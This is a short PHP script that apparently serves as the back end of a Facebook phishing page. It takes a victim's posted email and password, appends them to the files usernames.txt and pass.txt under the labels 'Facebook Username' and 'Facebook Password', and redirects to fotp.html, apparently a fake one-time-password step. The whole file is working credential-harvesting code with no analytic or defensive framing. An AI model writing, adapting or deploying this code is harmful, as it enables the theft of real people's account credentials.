<?php

file_put_contents("usernames.txt", "Facebook Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Facebook Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: fotp.html');
?>
